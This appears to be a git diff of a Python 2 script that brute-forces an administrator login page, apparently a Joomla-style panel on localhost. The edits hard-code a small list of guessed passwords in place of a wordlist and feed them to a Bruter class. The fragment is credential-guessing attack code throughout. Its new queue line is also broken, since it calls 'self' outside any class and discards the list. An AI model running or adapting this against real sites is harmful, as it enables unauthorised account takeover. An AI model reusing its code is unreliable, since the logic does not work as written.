@@ -37,7 +37,6 @@ resp = urllib2.urlopen(req)
 
 contents = resp.read()
 
-print contents
 
 error = "Username and password do not match or you do not have an account yet"
 
@@ -64,6 +63,7 @@ target_post = "http://localhost/administrator/index.php"
 username_field= "username"
 password_field= "passwd"
 success_check = "Administration - Control Panel"
+
 
 class Bruter(object):
 
@@ -136,6 +136,19 @@ class BruteParser(HTMLParser):
 # have to test this stuff
 # scavange
 # implement proxy switchng
-words = build_wordlist(wordlist_file)
+# words have to be of type "Queue" what ever this is ...
+# have to convert list into queue
+
+
+#words = build_wordlist(wordlist_file)
+
+
+
+
+words = ["password1", "password2", "killer", "password4"]
+
+words = [self.queryQ.put(query) for query in words]
+
+
 bruter_obj = Bruter(username,words)
 bruter_obj.run_bruteforce()
